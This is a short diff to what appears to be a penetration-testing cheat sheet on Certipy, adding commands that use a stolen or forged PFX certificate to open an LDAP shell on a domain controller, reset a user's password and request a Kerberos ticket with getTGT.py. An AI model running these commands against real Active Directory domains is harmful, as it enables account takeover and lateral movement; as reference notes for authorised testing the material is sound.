@@ -22,6 +22,16 @@ certipy auth \
   -domain domain.local \
   -username user \
   -dc-ip 10.10.10.10
+
+// LDAP Shell
+certipy-ad auth \
+  -pfx kerberos_user.pfx \
+  -dc-ip 192.168.0.150 \
+  -ldap-shell
+
+$ whoami
+$ change_password kerberos_user NewPassword123!
+python3 getTGT.py domain.local/user:Password123
 ```
 
 ## PFX to PEM
